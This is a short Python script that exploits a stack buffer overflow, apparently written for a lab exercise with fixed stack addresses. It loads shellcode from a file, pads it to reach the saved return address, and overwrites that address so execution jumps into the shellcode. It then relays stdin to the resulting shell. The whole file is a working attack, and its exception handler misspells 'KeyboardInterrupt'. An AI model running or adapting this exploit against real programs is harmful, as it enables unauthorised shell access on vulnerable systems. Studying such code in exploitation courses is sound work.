#!/usr/bin/env python3
import os
import sys
import struct

bufferAddr = 0x7fffffffe290
retAddr = 0x7fffffffe318

shellfile = open("getshell", "rb")
shellcode = shellfile.read()

shellcode += b"A"*(retAddr-bufferAddr-len(shellcode))
shellcode += struct.pack("<Q", bufferAddr)

fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(shellcode)
fp.flush()

while True:
    try:
        data = sys.stdin.buffer.read1(1024)
        
        if not data:
            break
        
        fp.write(data)
        fp.flush()
    except KeyBoardInterrupt:
        break
